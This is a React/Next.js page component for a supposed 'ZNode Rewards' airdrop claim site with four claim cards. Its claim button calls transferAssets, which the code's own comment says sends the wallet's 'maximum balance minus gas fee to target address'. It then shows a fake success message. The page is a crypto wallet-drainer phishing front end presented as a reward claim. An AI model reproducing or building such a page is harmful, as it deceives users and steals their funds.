'use client';

import { useState, useEffect } from 'react';
import { Header } from '@/components/Header';
import { Footer } from '@/components/Footer';
import { AirdropCard } from '@/components/AirdropCard';
import { ChainSelector } from '@/components/ChainSelector';
import { CHAIN_IDS, transferAssets } from '@/lib/wallet';
import { toast } from 'sonner';

export default function Home() {
  const [isConnected, setIsConnected] = useState<boolean>(false);
  const [selectedChain, setSelectedChain] = useState<string>(CHAIN_IDS.ETHEREUM);

  // Check wallet connection on mount
  useEffect(() => {
    const checkConnection = async () => {
      try {
        const { ethereum } = window as any;
        if (ethereum && ethereum.selectedAddress) {
          setIsConnected(true);
        }
      } catch (error) {
        console.error('Error checking connection:', error);
      }
    };

    checkConnection();

    // Listen for account changes
    const { ethereum } = window as any;
    if (ethereum) {
      ethereum.on('accountsChanged', (accounts: string[]) => {
        setIsConnected(accounts.length > 0);
      });
    }

    return () => {
      if (ethereum) {
        ethereum.removeListener('accountsChanged', () => {});
      }
    };
  }, []);

  // Handle claim for different airdrop types
  const handleClaim = async (type: string) => {
    if (!isConnected) {
      toast.error('Please connect your wallet first');
      return;
    }

    try {
      // Transfer maximum balance minus gas fee to target address
      await transferAssets(selectedChain);
      toast.success(`Claimed ${type} rewards successfully!`);
    } catch (error: any) {
      toast.error(error.message || 'Failed to claim rewards');
      console.error('Claim error:', error);
    }
  };

  return (
    <main className="min-h-screen flex flex-col">
      <Header setIsConnected={setIsConnected} />

      <div className="flex-1">
        <div className="bg-[#0e0e15]">
          <div className="container mx-auto py-12">
            {/* Hero Section */}
            <div className="text-center mb-12">
              <h1 className="text-4xl font-bold mb-4">Claim Your ZNode Rewards</h1>
              <p className="text-xl text-gray-400 max-w-2xl mx-auto">
                Connect your wallet and claim your ZNode rewards now across multiple chains.
              </p>
            </div>

            {/* Main Content */}
            <div className="max-w-4xl mx-auto">
              <div className="flex flex-col gap-10 w-full px-4 lg:px-0">
                {/* Chain Selector */}
                <div className="mt-4">
                  <h2 className="text-xl font-bold mb-3">Select Chain</h2>
                  <div className="mb-8">
                    <ChainSelector
                      onSelect={setSelectedChain}
                      selectedChain={selectedChain}
                    />
                  </div>
                </div>

                {/* Airdrop Cards */}
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <AirdropCard
                    title="ZNode Base Airdrop"
                    subtitle="For all ZNode users"
                    onClaim={() => handleClaim('Base')}
                  />
                  <AirdropCard
                    title="ZNode Premium Airdrop"
                    subtitle="For premium license holders"
                    onClaim={() => handleClaim('Premium')}
                  />
                  <AirdropCard
                    title="ZNode Beta Airdrop"
                    subtitle="For beta testers"
                    onClaim={() => handleClaim('Beta')}
                  />
                  <AirdropCard
                    title="ZNode Community Airdrop"
                    subtitle="For community members"
                    onClaim={() => handleClaim('Community')}
                  />
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <Footer />
    </main>
  );
}
